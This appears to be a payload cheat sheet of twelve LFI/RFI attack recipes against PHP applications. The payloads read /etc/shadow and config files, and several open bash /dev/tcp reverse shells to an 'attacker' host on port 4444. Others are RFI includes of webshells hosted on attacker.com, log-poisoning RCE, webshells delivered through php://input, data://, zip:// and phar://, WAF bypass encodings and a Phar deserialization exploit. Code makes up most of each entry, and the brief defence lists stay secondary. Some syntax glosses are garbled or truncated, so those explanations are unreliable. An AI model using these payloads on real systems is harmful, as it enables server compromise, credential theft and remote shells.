# LFI/RFI File Inclusion

_12 web payloads_

### Local File Inclusion  `lfi-basic`
_Local file inclusion vulnerability exploitation techniques_
Subcategory: **Local Inclusion** · tags: `lfi` `local` `file` `inclusion`

**Prerequisites:**
- A file inclusion feature exists
- The user can control the inclusion path

**Attack Chain:**

**1. Probe for LFI**
> Probe for local file inclusion
```
?file=../../../etc/passwd
?file=....//....//....//etc/passwd
?file=..\..\..\windows\win.ini
?page=php://filter/convert.base64-encode/resource=index.php
```
**Syntax breakdown:**
- `../` — parent directory traversal _path_
- `etc/passwd` — Linux user file _value_

**2. Read sensitive files**
> Read Linux sensitive files
_platform: linux_
```
../../../etc/passwd
../../../etc/shadow
../../../var/log/apache2/access.log
../../../proc/self/environ
../../../proc/self/cmdline
```
**Syntax breakdown:**
- `/proc/self/` — current process information directory _path_
- `environ` — environment variables file _value_

**3. PHP pseudo-protocols**
> Use PHP pseudo-protocols
```
php://filter/convert.base64-encode/resource=config.php
php://input (POST data as input)
php://data://text/plain,<?php phpinfo();?>
phar://archive.zip/shell.php
```
**Syntax breakdown:**
- `php://filter` — PHP Filter pseudo-protocol _value_
- `php://input` — read POST data _value_
- `data://` — Data pseudo-protocol _value_

**4. Log poisoning**
> Achieve RCE via log poisoning
_platform: linux_
```
1. Include the log file: ../../../var/log/apache2/access.log
2. Inject in the User-Agent: <?php system($_GET['c']); ?>
3. Access: ?file=../../../var/log/apache2/access.log&c=id
```
**Syntax breakdown:**
- `access.log` — Apache access log _path_
- `User-Agent` — user agent header _value_

**WAF/EDR Bypass Variants:**

**Directory traversal bypass**
> Bypass directory traversal filtering
```
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
....\/....\/....\/etc/passwd
```
**Syntax breakdown:**
- `%252f` — double-URL-encoded slash _encoding_
- `%c0%af` — UTF-8-encoded slash _variable_

**Suffix bypass**
> Bypass the file suffix check
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd/.jpg
php://filter/convert.base64-encode/resource=config.php%00
```
**Syntax breakdown:**
- `%00` — null byte truncation _encoding_

**Overview:** A Local File Inclusion (LFI) vulnerability allows an attacker to read arbitrary files on the server by manipulating a file path parameter, including sensitive information such as configuration files, source code, and password files. In severe cases, combined with techniques such as log poisoning, remote code execution can be achieved.

**Vulnerability Principle:** LFI vulnerabilities stem from an application concatenating user input directly into a file operation function (such as PHP's include/require/fopen). An attacker uses the ../ directory traversal symbol to access files outside the web root, such as /etc/passwd, /etc/shadow, and application configuration files.

**Exploitation Method:** Complete exploitation flow:
1. Probe for the file inclusion point
2. Use directory traversal to read sensitive files
3. Use pseudo-protocols to read source code
4. Achieve RCE via log poisoning

**Defensive Measures:** Defenses:
1. Validate the filename against an allowlist
2. Disable PHP pseudo-protocols
3. Use basename() to process the path
4. Restrict the inclusion directory

---

### Remote File Inclusion  `rfi-basic`
_Remote file inclusion vulnerability exploitation techniques_
Subcategory: **Remote Inclusion** · tags: `rfi` `remote` `file` `inclusion`

**Prerequisites:**
- A file inclusion feature exists
- allow_url_include=On
- The user can control the inclusion path

**Attack Chain:**

**1. Probe for RFI**
> Probe for remote file inclusion
```
?file=http://attacker.com/shell.txt
?file=http://attacker.com/shell.txt%00
?file=http://attacker.com/shell.txt?
```
**Syntax breakdown:**
- `http://` — remote URL protocol _domain_
- `attacker.com` — attacker's server _domain_
- `%00` — null byte truncation to bypass the suffix _encoding_

**2. Host a malicious file**
> Host a malicious file and execute it
```
# shell.txt content
<?php system($_GET['cmd']); ?>

# Access
?file=http://attacker.com/shell.txt&cmd=id
```
**Syntax breakdown:**
- `system()` — system command execution _function_

**3. Reverse shell**
> Obtain a reverse shell
_platform: linux_
```
# shell.txt content
<?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# Or use
<?php $sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```
**Syntax breakdown:**
- `EXEC` — execute a stored procedure _keyword_
- `system()` — system command execution _function_

**4. Use the data protocol**
> Use the data protocol to execute code
```
?file=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```
**Syntax breakdown:**
- `data://` — Data pseudo-protocol _value_
- `text/plain` — MIME type _value_
- `base64` — Base64 encoding _encoding_

**WAF/EDR Bypass Variants:**

**Double-write bypass**
> Double-write bypass of keyword filtering
```
?file=htthttp://p://attacker.com/shell.txt
?file=http://attackerattacker.com.com/shell.txt
```
**Syntax breakdown:**
- `?file=htthttp://p://attacker.com/shell.txt
?file=http://attackerattacker.com.co` — attack payload _value_

**Case obfuscation**
> Case obfuscation bypass
```
?file=HtTp://attacker.com/shell.txt
?file=HTTP://attacker.com/shell.txt
```
**Syntax breakdown:**
- `?file=HtTp://attacker.com/shell.txt
?file=HTTP://attacker.com/shell.txt` — attack payload _value_

**Protocol substitution**
> Use other protocols
```
?file=ftp://attacker.com/shell.txt
?file=php://filter/convert.base64-encode/resource=http://attacker.com/shell.txt
```
**Syntax breakdown:**
- `?file=ftp://attacker.com/shell.txt
?file=php://filter/convert.base64-encode/res` — attack payload _value_

**Overview:** Remote File Inclusion (RFI) allows an attacker to include and execute a malicious file from a remote server in the target application, directly achieving remote code execution. RFI requires PHP's allow_url_include configuration to be enabled (disabled by default).

**Vulnerability Principle:** The RFI vulnerability further builds on LFI: when PHP's allow_url_include=On, the include()/require() functions can load a PHP file from a remote URL and execute it locally. An attacker only needs to place a malicious PHP script on their own server to achieve RCE.

**Exploitation Method:** Complete exploitation flow:
1. Probe for remote file inclusion
2. Host a malicious PHP file
3. Include and execute the code
4. Obtain a shell

**Defensive Measures:** Defenses:
1. Set allow_url_include=Off
2. Validate the filename against an allowlist
3. Disable remote file inclusion
4. Restrict the inclusion directory

---

### Log Poisoning LFI  `lfi-log-poison`
_Achieve LFI to RCE via log poisoning_
Subcategory: **Log Poisoning** · tags: `lfi` `log` `poison` `rce`

**Prerequisites:**
- An LFI vulnerability exists
- The log file can be included
- The log file is writable

**Attack Chain:**

**1. Probe for the log file location**
> Probe for the log file location
_platform: linux_
```
# Apache logs
../../../var/log/apache2/access.log
../../../var/log/apache2/error.log
../../../var/log/httpd/access_log
../../../var/log/nginx/access.log

# System logs
../../../var/log/auth.log
../../../var/log/syslog
```
**Syntax breakdown:**
- `access.log` — Apache access log _path_
- `error.log` — Apache error log _path_

**2. Poison the User-Agent**
> Inject code in the User-Agent
```
# Poison using curl
curl -A "<?php system($_GET['c']); ?>" http://target.com/

# Or use Burp Suite to modify the User-Agent
User-Agent: <?php system($_GET['c']); ?>
```
**Syntax breakdown:**
- `-A` — curl sets the User-Agent _parameter_
- `<?php` — PHP opening tag _value_

**3. Poison the request path**
> Inject code in the request path
```
# Inject in the URL path
curl http://target.com/<?php system($_GET['c']); ?>

# URL-encode
curl http://target.com/%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E
```
**Syntax breakdown:**
- `system()` — system command execution _function_
- `curl` — HTTP request tool _command_

**4. Execute commands**
> Include the log file to execute commands
_platform: linux_
```
# Include the log file and execute commands
?file=../../../var/log/apache2/access.log&c=id
?file=../../../var/log/apache2/access.log&c=whoami
?file=../../../var/log/apache2/access.log&c=cat /etc/passwd
```
**Syntax breakdown:**
- `../` — directory backtracking _technique_
- `/etc/passwd` — system file _path_

**5. Reverse shell**
> Obtain a reverse shell
_platform: linux_
```
?file=../../../var/log/apache2/access.log&c=bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
```
**Syntax breakdown:**
- `../` — path traversal _path_

**WAF/EDR Bypass Variants:**

**Encoding bypass**
> WAF bypass technique
```
# Use Base64 encoding
<?php eval(base64_decode($_GET['c'])); ?>
# Then pass the Base64-encoded command
```
**Syntax breakdown:**
- `eval()` — code execution _function_
- `base64_decode` — Base64 decode _function_

**Overview:** LFI log poisoning injects malicious code into the web server log (access.log/error.log), then includes that log file via LFI to trigger code execution. It is the classic technique for upgrading an LFI vulnerability from file reading to RCE.

**Vulnerability Principle:** Log poisoning exploits the fact that the web server writes HTTP request information (User-Agent, Referer, etc.) into the log. An attacker injects PHP code (such as <?php system($_GET[cmd]);?>) into the request headers, the code is written to the log, and it is triggered to execute by including the log file via LFI.

**Exploitation Method:** Complete exploitation flow:
1. Find the log file location
2. Inject PHP code in the request
3. Include the log file
4. Execute a system command

**Defensive Measures:** Defenses:
1. Restrict log file inclusion
2. Filter special characters in the log
3. Disable PHP execution
4. Use a secure log configuration

---

### PHP Pseudo-Protocol Exploitation  `lfi-wrapper`
_Use PHP pseudo-protocols for LFI attacks_
Subcategory: **Pseudo-Protocols** · tags: `lfi` `wrapper` `php` `protocol`

**Prerequisites:**
- An LFI vulnerability exists
- PHP environment
- Pseudo-protocols are not disabled

**Attack Chain:**

**1. php://filter**
> Use php://filter to read source code
```
# Read source code (Base64)
?file=php://filter/convert.base64-encode/resource=config.php

# Read source code (Rot13)
?file=php://filter/read=string.rot13/resource=config.php

# Multiple filters
?file=php://filter/convert.base64-encode|string.rot13/resource=config.php
```
**Syntax breakdown:**
- `php://filter` — PHP Filter pseudo-protocol _value_
- `convert.base64-encode` — Base64 encoding filter _value_
- `resource=` — specify the resource file _value_

**2. php://input**
> Use php://input to execute code
```
# POST to execute PHP code
?file=php://input
POST: <?php system('id'); ?>

# Execute arbitrary code
POST: <?php phpinfo(); ?>
POST: <?php echo file_get_contents('/etc/passwd'); ?>
```
**Syntax breakdown:**
- `php://input` — read the POST data stream _value_
- `POST` — POST request body _method_

**3. data:// protocol**
> Use the data:// protocol to execute code
```
# Directly execute code
?file=data://text/plain,<?php system('id'); ?>

# Base64 encoding
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Execute arbitrary commands
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
```
**Syntax breakdown:**
- `data://` — Data pseudo-protocol _value_
- `text/plain` — MIME type _value_

**4. phar:// protocol**
> Use the phar:// protocol
```
# Create the phar file
<?php
$p = new Phar('shell.phar');
$p->addFromString('shell.txt', '<?php system($_GET["c"]); ?>');
?>

# Include the phar
?file=phar://shell.phar/shell.txt&c=id
```
**Syntax breakdown:**
- `phar://` — PHP archive protocol _value_
- `shell.phar` — Phar file _value_

**5. zip:// protocol**
> Use the zip:// protocol
```
# Create the zip file
zip shell.zip shell.txt
# shell.txt content: <?php system($_GET['c']); ?>

# Include the zip
?file=zip://shell.zip%23shell.txt&c=id

# Use jpg+zip
copy shell.jpg+shell.zip shell.jpg
?file=zip://shell.jpg%23shell.txt&c=id
```
**Syntax breakdown:**
- `zip://` — ZIP protocol _value_
- `%23` — the URL encoding of # _encoding_

**WAF/EDR Bypass Variants:**

**Case obfuscation**
> Case obfuscation bypass
```
?file=Php://filter/convert.base64-encode/resource=config.php
?file=DATA://text/plain,<?php system('id'); ?>
```
**Syntax breakdown:**
- `system()` — execute a system command _function_
- `base64` — Base64 encoding _encoding_
- `php://filter` — PHP stream filter _technique_
- `data://` — data stream protocol _technique_

**Double URL encoding**
> Double URL encoding bypass
```
?file=php%3A%2F%2Ffilter/convert.base64-encode/resource=config.php
?file=%70%68%70%3a%2f%2finput
```
**Syntax breakdown:**
- `?file=php%3A%2F%2Ffilter/convert.base64-encode/resource=config.php
?file=%70%68` — attack payload _value_

**Overview:** PHP pseudo-protocols (wrappers) are a core technique in LFI exploitation, expanding LFI's attack capability via php://filter to read source code, php://input to execute code, data:// to pass a payload, zip:// to include a compressed file, and so on.

**Vulnerability Principle:** PHP pseudo-protocol exploitation uses the various stream protocols supported by functions such as include(): php://filter can Base64-encode and read PHP source code (avoiding execution), php://input reads content from POST data, data:// directly embeds data, expect:// executes system commands (requires an extension).

**Exploitation Method:** Complete exploitation flow:
1. Probe for the LFI vulnerability
2. Use php://filter to read source code
3. Use php://input to execute code
4. Use data:// to execute arbitrary code

**Defensive Measures:** Defenses:
1. Disable pseudo-protocols (php.ini configuration)
2. Use allowlist validation
3. Restrict the inclusion directory
4. Upgrade the PHP version

---

### Directory Traversal Techniques  `lfi-traversal`
_LFI directory traversal bypass techniques_
Subcategory: **Directory Traversal** · tags: `lfi` `traversal` `bypass` `path`

**Prerequisites:**
- An LFI vulnerability exists
- Path filtering exists

**Attack Chain:**

**1. Basic traversal**
> Basic directory traversal
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
..\..\..\windows\win.ini
```
**Syntax breakdown:**
- `../` — directory backtracking _technique_
- `/etc/passwd` — system file _path_
- `..\\` — Windows path backtracking _technique_

**2. Bypass ../ removal**
> Bypass filtering that removes ../
```
....//....//....//etc/passwd
....//....//etc/passwd
..././..././..././etc/passwd
```
**Syntax breakdown:**
- `....//` — becomes ../ after removing ../ _value_
- `..././` — becomes ../ after removing ../ _value_

**3. URL encoding bypass**
> URL encoding bypass
```
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```
**Syntax breakdown:**
- `%2f` — URL encoding of a slash _encoding_
- `%252f` — double URL encoding _encoding_
- `%2e%2e` — URL encoding of a dot _encoding_

**4. Unicode encoding bypass**
> Unicode encoding bypass
```
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cwindows\win.ini
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
```
**Syntax breakdown:**
- `%c0%af` — UTF-8-encoded slash _variable_
- `%c1%9c` — UTF-8-encoded backslash _variable_

**5. Absolute path bypass**
> Use an absolute path
```
/etc/passwd
/etc/shadow
/var/log/apache2/access.log
C:/windows/win.ini
C:\windows\system32\config\sam
```
**Syntax breakdown:**
- `/etc/passwd` — sensitive file path _path_

**WAF/EDR Bypass Variants:**

**Mixed encoding**
> Mixed encoding bypass
```
..%2f..%c0%af..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
**Syntax breakdown:**
- `..%2f..%c0%af..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd` — attack payload _value_

**Null byte truncation**
> Null byte truncation to bypass the suffix
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.html
```
**Syntax breakdown:**
- `%00` — null byte truncation _encoding_

**Dot truncation (Windows)**
> Windows dot truncation
_platform: windows_
```
../../../windows/win.ini.
../../../windows/win.ini...
../../../boot.ini……
```
**Syntax breakdown:**
- `../../../windows/win.ini.
../../../windows/win.ini...
../../../boot.ini……` — attack payload _value_

**Overview:** Path Traversal is the most basic LFI exploitation method, breaking through the application's restricted directory scope via the ../ sequence to access arbitrary files on the filesystem. Various encoding and path normalization tricks can bypass simple filtering measures.

**Vulnerability Principle:** A directory traversal vulnerability can still be bypassed when the application only does simple string filtering (such as replacing ../): double-writing (....//→../), URL encoding (%2e%2e%2f), Unicode encoding, mixed case, operating system path differences (Windows backslash), and other bypass techniques.

**Exploitation Method:** Complete exploitation flow:
1. Probe for the LFI vulnerability
2. Try basic traversal
3. Use encoding to bypass
4. Read sensitive files

**Defensive Measures:** Defenses:
1. Use basename() to process the path
2. Validate the filename against an allowlist
3. Disable special characters
4. Use realpath() for validation

---

### PHP Filter Chain Attack  `lfi-php-filter`
_Use PHP Filter chains for LFI attacks_
Subcategory: **PHP Filter** · tags: `lfi` `php` `filter` `chain`

**Prerequisites:**
- An LFI vulnerability exists
- PHP environment
- The filter pseudo-protocol is available

**Attack Chain:**

**1. Read source code**
> Use Filter to read source code
```
# Base64-encoded read
?file=php://filter/convert.base64-encode/resource=index.php

# Rot13 read
?file=php://filter/read=string.rot13/resource=index.php

# Character conversion
?file=php://filter/read=string.toupper/resource=index.php
```
**Syntax breakdown:**
- `convert.base64-encode` — Base64 encoding filter _value_
- `string.rot13` — Rot13 encoding filter _value_

**2. Multiple filters**
> Use multiple filters
```
# Multiple encoding
?file=php://filter/convert.base64-encode|string.rot13/resource=config.php

# Strip PHP tags
?file=php://filter/read=string.strip_tags/resource=index.php
```
**Syntax breakdown:**
- `|` — filter chaining operator _operator_
- `string.strip_tags` — strip HTML/PHP tags _value_

**3. Filter chain RCE**
> Use advanced filters
```
# Use the iconv filter
?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php

# Use zlib compression
?file=php://filter/zlib.deflate/resource=index.php
?file=php://filter/zlib.inflate/resource=data
```
**Syntax breakdown:**
- `php://filter` — PHP filter _method_

**4. Read configuration files**
> Read common framework configurations
```
# WordPress configuration
?file=php://filter/convert.base64-encode/resource=wp-config.php

# Laravel .env
?file=php://filter/convert.base64-encode/resource=../.env

# ThinkPHP configuration
?file=php://filter/convert.base64-encode/resource=application/database.php
```
**Syntax breakdown:**
- `php://filter` — PHP filter _method_
- `../` — path traversal _path_

**WAF/EDR Bypass Variants:**

**Case obfuscation**
> Case obfuscation bypass
```
?file=PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=config.php
?file=PhP://FiLtEr/convert.base64-encode/resource=config.php
```
**Syntax breakdown:**
- `?file=PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=config.php
?file=PhP://FiLtEr` — attack payload _value_

**Encoding bypass**
> URL encoding bypass
```
?file=%70%68%70%3a%2f%2f%66%69%6c%74%65%72/convert.base64-encode/resource=config.php
```
**Syntax breakdown:**
- `?file=%70%68%70%3a%2f%2f%66%69%6c%74%65%72/convert.base64-encode/resource=config` — attack payload _value_

**Overview:** php://filter is the most practical pseudo-protocol in LFI exploitation. It can output file content after various conversions (Base64 encode/decode, ROT13, etc.). Its most common use is reading PHP source code (avoiding server-side parsing and execution, which would hide the source).

**Vulnerability Principle:** php://filter converts a data stream via chained filters: convert.base64-encode encodes the PHP source into a Base64 string for output (avoiding execution), string.rot13 performs a ROT13 transformation, and convert.iconv performs character set conversion. Filter chains can be combined to achieve more complex data operations.

**Exploitation Method:** Complete exploitation flow:
1. Probe for the LFI vulnerability
2. Use Base64 encoding to read source code
3. Decode to obtain the source code
4. Analyze the source code to find other vulnerabilities

**Defensive Measures:** Defenses:
1. Disable php://filter
2. Validate the filename against an allowlist
3. Use realpath() for validation
4. Restrict the inclusion directory

---

### PHP Input Execution  `lfi-php-input`
_Use php://input to execute PHP code_
Subcategory: **PHP Input** · tags: `lfi` `php` `input` `rce`

**Prerequisites:**
- An LFI vulnerability exists
- allow_url_include=On
- The POST method is available

**Attack Chain:**

**1. Basic execution**
> Use php://input to execute code
```
# GET request
GET ?file=php://input

# POST data
POST: <?php system('id'); ?>
POST: <?php echo 'Hello'; ?>
```
**Syntax breakdown:**
- `php://input` — read the POST data stream _value_
- `<?php` — PHP opening tag _value_

**2. Command execution**
> Execute a system command
```
# Execute a system command
POST: <?php system($_GET['c']); ?>
# Then access: ?file=php://input&c=id

# Use exec
POST: <?php echo exec('id'); ?>

# Use shell_exec
POST: <?php echo shell_exec('id'); ?>
```
**Syntax breakdown:**
- `system()` — execute a command and output _function_
- `exec()` — execute a command and return the last line _function_
- `shell_exec()` — execute a command and return all output _function_

**3. File operations**
> File operations
```
# Read a file
POST: <?php echo file_get_contents('/etc/passwd'); ?>

# Write a file
POST: <?php file_put_contents('shell.php', '<?php system($_GET["c"]); ?>'); ?>

# List a directory
POST: <?php print_r(scandir('.')); ?>
```

**4. Reverse shell**
> Obtain a reverse shell
_platform: linux_
```
POST: <?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# Or use
POST: <?php $sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```
**Syntax breakdown:**
- `EXEC` — execute a stored procedure _keyword_
- `system()` — system command execution _function_

**WAF/EDR Bypass Variants:**

**Encoding bypass**
> Bypass using encoding
```
# Base64 encoding
POST: <?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw==')); ?>
# After decoding: system($_GET['c']);

# Rot13 encoding
POST: <?php eval(str_rot13('flfgrz($_TRG['p']);')); ?>
```
**Syntax breakdown:**
- `eval()` — code execution _function_
- `base64_decode` — Base64 decode _function_

**Short tags**
> WAF bypass technique
```
POST: <?=system($_GET['c']);?>
POST: <?=`$_GET[c]`?>
```
**Syntax breakdown:**
- `system()` — system command execution _function_

**Overview:** The php://input pseudo-protocol can read raw data from the POST body of an HTTP request. When combined with include(), an attacker can pass PHP code via the POST body to achieve remote code execution (requires allow_url_include=On).

**Vulnerability Principle:** php://input provides the POST request body as a data stream to the file inclusion function. When include("php://input") is executed, the PHP code in the POST body will be parsed and executed. This method does not require creating a file on the server and executes the malicious code directly in memory.

**Exploitation Method:** Complete exploitation flow:
1. Probe for the LFI vulnerability
2. Use php://input
3. POST PHP code
4. Obtain a shell

**Defensive Measures:** Defenses:
1. Set allow_url_include=Off
2. Disable php://input
3. Allowlist validation
4. Restrict the POST content

---

### PHP Data Protocol Attack  `lfi-php-data`
_Use the data:// protocol to execute PHP code_
Subcategory: **PHP Data** · tags: `lfi` `php` `data` `protocol`

**Prerequisites:**
- An LFI vulnerability exists
- allow_url_include=On
- The data protocol is available

**Attack Chain:**

**1. Basic execution**
> Use the data:// protocol to execute code
```
# Directly execute
?file=data://text/plain,<?php system('id'); ?>

# Execute phpinfo
?file=data://text/plain,<?php phpinfo(); ?>

# Output text
?file=data://text/plain,Hello World
```
**Syntax breakdown:**
- `data://` — Data pseudo-protocol _value_
- `text/plain` — MIME type _value_
- `,` — data separator _value_

**2. Base64 encoding**
> Use Base64 encoding
```
# Base64-encoded execution
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
# After decoding: <?php system('id'); ?>

# Execute with parameters
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id
```
**Syntax breakdown:**
- `base64` — Base64 encoding identifier _encoding_
- `PD9waHA...` — Base64-encoded PHP code _value_

**3. Command execution**
> Execute a system command
```
# Interactive commands
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
?file=data://text/plain,<?php system($_GET['c']); ?>&c=whoami
?file=data://text/plain,<?php system($_GET['c']); ?>&c=cat /etc/passwd
```
**Syntax breakdown:**
- `system()` — execute a system command _function_
- `data://` — data stream protocol _technique_

**4. Reverse shell**
> Obtain a reverse shell
_platform: linux_
```
?file=data://text/plain,<?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# Base64 version
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJiYXNoIC1jIFwiYmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjFcIiIpOyA/Pg==
```
**Syntax breakdown:**
- `system()` — execute a system command _function_
- `data://` — data stream protocol _technique_

**WAF/EDR Bypass Variants:**

**Case obfuscation**
> Case obfuscation bypass
```
?file=DATA://TEXT/PLAIN,<?php system('id'); ?>
?file=Data://Text/Plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```
**Syntax breakdown:**
- `system()` — execute a system command _function_
- `data://` — data stream protocol _technique_

**URL encoding**
> URL encoding bypass
```
?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%69%64%27%29%3b%20%3f%3e
```
**Syntax breakdown:**
- `?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%3c%3f%70%68%70%20%7` — attack payload _value_

**MIME type transformation**
> Transform the MIME type
```
?file=data://text/html,<?php system('id'); ?>
?file=data://application/x-httpd-php,<?php system('id'); ?>
```
**Syntax breakdown:**
- `system()` — execute a system command _function_
- `data://` — data stream protocol _technique_

**Overview:** The data:// pseudo-protocol allows data content to be embedded directly in the URL. When combined with LFI, PHP code can be included and executed as a "file". It supports Base64 encoding and can bypass some content detection (requires allow_url_include=On).

**Vulnerability Principle:** The data:// protocol provides inline data as a stream to the file inclusion function: data://text/plain,<?php phpinfo();?> passes plaintext PHP code directly, data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+ passes Base64-encoded code, which can bypass simple keyword filtering.

**Exploitation Method:** Complete exploitation flow:
1. Probe for the LFI vulnerability
2. Construct a data:// payload
3. Execute PHP code
4. Obtain a shell

**Defensive Measures:** Defenses:
1. Set allow_url_include=Off
2. Disable the data:// protocol
3. Allowlist validation
4. Filter special characters

---

### PHP Zip Protocol Attack  `lfi-php-zip`
_Use the zip:// protocol for LFI attacks_
Subcategory: **PHP Zip** · tags: `lfi` `php` `zip` `archive`

**Prerequisites:**
- An LFI vulnerability exists
- A zip file can be uploaded
- The zip protocol is available

**Attack Chain:**

**1. Create a malicious Zip**
> Create a malicious Zip file
```
# Create shell.txt
echo '<?php system($_GET["c"]); ?>' > shell.txt

# Create the zip file
zip shell.zip shell.txt

# Or use Python
import zipfile
with zipfile.ZipFile('shell.zip', 'w') as z:
    z.writestr('shell.txt', '<?php system($_GET["c"]); ?>')
```
**Syntax breakdown:**
- `zip` — create a zip archive _value_
- `shell.txt` — file containing PHP code _path_

**2. Upload the Zip file**
> Upload the Zip file
```
# Upload shell.zip via the file upload feature
# Or upload via another method

# Remember the upload path
/uploads/shell.zip
```

**3. Include the Zip file**
> Include the Zip file to execute code
```
# Include using the zip:// protocol
?file=zip://uploads/shell.zip%23shell.txt&c=id

# %23 is the URL encoding of #
# Format: zip://path#filename
```
**Syntax breakdown:**
- `zip://` — ZIP protocol _value_
- `%23` — the URL encoding of # _encoding_
- `shell.txt` — the filename inside the Zip _path_

**4. Image-embedded shell**
> Upload an image-embedded shell
```
# Create an image-embedded shell
copy image.jpg+shell.zip image.jpg

# Or use
cat image.jpg shell.zip > image.jpg

# Include
?file=zip://uploads/image.jpg%23shell.txt&c=id
```
**Syntax breakdown:**
- `%xx` — URL encoding _encoding_

**WAF/EDR Bypass Variants:**

**Use phar://**
> Use the phar:// protocol
```
?file=phar://uploads/shell.zip/shell.txt&c=id
# phar:// can also access zip files
```
**Syntax breakdown:**
- `?file=phar://uploads/shell.zip/shell.txt&c=id
#` — command/payload start _command_
- ` phar:// can also access zip files` — parameters and payload content _value_

**Archive nesting**
> Archive nesting bypass
```
# Nest a zip inside a zip
zip inner.zip shell.txt
zip outer.zip inner.zip

# Include
?file=zip://outer.zip%23inner.zip%23shell.txt&c=id
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Nest a zip inside a zip
zip inner.zip shell.txt
zip outer.zip inner.zip

# Include
?file=zip://outer.zip%23inner.zip%23shell.txt&c=id` — parameters and payload content _value_

**Overview:** The zip:// pseudo-protocol can read and include a specified file from a ZIP archive. An attacker uploads a ZIP file containing malicious PHP code (which can be disguised as an image, etc.), then includes the PHP file within it via LFI's zip:// protocol to achieve code execution.

**Vulnerability Principle:** zip:// protocol exploitation steps: 1) compress a PHP webshell into a ZIP file 2) the extension can be changed to .jpg/.png to bypass upload restrictions 3) via LFI, use zip://upload/shell.jpg#shell.php to include the PHP file within it 4) the PHP parser will extract and execute the code within it.

**Exploitation Method:** Complete exploitation flow:
1. Create a malicious Zip file
2. Upload the Zip file
3. Include using zip://
4. Execute code

**Defensive Measures:** Defenses:
1. Disable the zip:// protocol
2. Strictly validate uploaded files
3. Validate the filename against an allowlist
4. Restrict the inclusion directory

---

### Phar Deserialization Attack  `lfi-phar`
_Use Phar deserialization for RCE_
Subcategory: **Phar Deserialization** · tags: `lfi` `phar` `deserialization` `rce`

**Prerequisites:**
- An LFI vulnerability exists
- PHP environment
- The phar extension is available

**Attack Chain:**

**1. Create a Phar file**
> Create a malicious Phar file
```
# Create a malicious Phar
<?php
class Exploit {
    function __destruct() {
        system($_GET['c']);
    }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Exploit();
$phar->setMetadata($o);
$phar->stopBuffering();
?>
```
**Syntax breakdown:**
- `Phar` — PHP archive class _value_
- `setMetadata` — set the metadata (serialized object) _value_
- `__destruct` — destructor, called during deserialization _value_

**2. Trigger deserialization**
> Trigger Phar deserialization
```
# Trigger via file_exists
?file=phar://exploit.phar&c=id

# Trigger via file_get_contents
?file=phar://exploit.phar/test.txt&c=id

# Trigger via include
?file=phar://exploit.phar&c=id
```
**Syntax breakdown:**
- `phar://` — Phar protocol _value_
- `exploit.phar` — Phar file _value_

**3. Image-embedded Phar**
> Use an image-embedded Phar
```
# Create an image Phar
copy exploit.phar exploit.gif

# Or add a GIF header
cp exploit.phar exploit.gif

# Trigger
?file=phar://uploads/exploit.gif&c=id
```

**4. Common gadget chains**
> Use common gadget chains
```
# Laravel POP chain
# Symfony POP chain
# WordPress POP chain
# ThinkPHP POP chain

# Generate using phpggc
git clone https://github.com/ambionics/phpggc
php phpggc Laravel/RCE1 system id > exploit.phar
```

**WAF/EDR Bypass Variants:**

**Base64 encoding**
> Base64 encoding bypass
```
# Base64-encode the Phar content
# Then decode to trigger
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Base64-encode the Phar content
# Then decode to trigger` — parameters and payload content _value_

**Pseudo-protocol combination**
> Pseudo-protocol combination
```
?file=php://filter/convert.base64-encode/resource=phar://exploit.phar
# Use in combination
```
**Syntax breakdown:**
- `?file=php://filter/convert.base64-encode/resource=phar://exploit.phar
#` — command/payload start _command_
- ` Use in combination` — parameters and payload content _value_

**Overview:** The phar:// pseudo-protocol can include the content of a PHP Archive file, similar to zip:// but more powerful. In particular, the phar deserialization vulnerability can trigger the deserialization of a PHP object without calling unserialize().

